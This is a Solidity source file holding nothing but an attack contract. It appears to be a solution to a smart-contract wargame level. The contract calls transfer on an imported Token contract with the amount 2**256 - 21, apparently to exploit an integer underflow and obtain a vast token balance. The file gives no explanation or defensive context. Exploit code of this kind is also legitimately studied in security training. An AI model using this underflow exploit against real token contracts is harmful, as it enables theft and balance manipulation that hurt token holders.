// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Token.sol";


contract Attack {
    Token token;

    constructor(address _token) public {
        token = Token(_token);
    }

    function attack(address addr) public {
        token.transfer(addr, (2 ** 256 - 21));
    }

    receive() external payable {}
}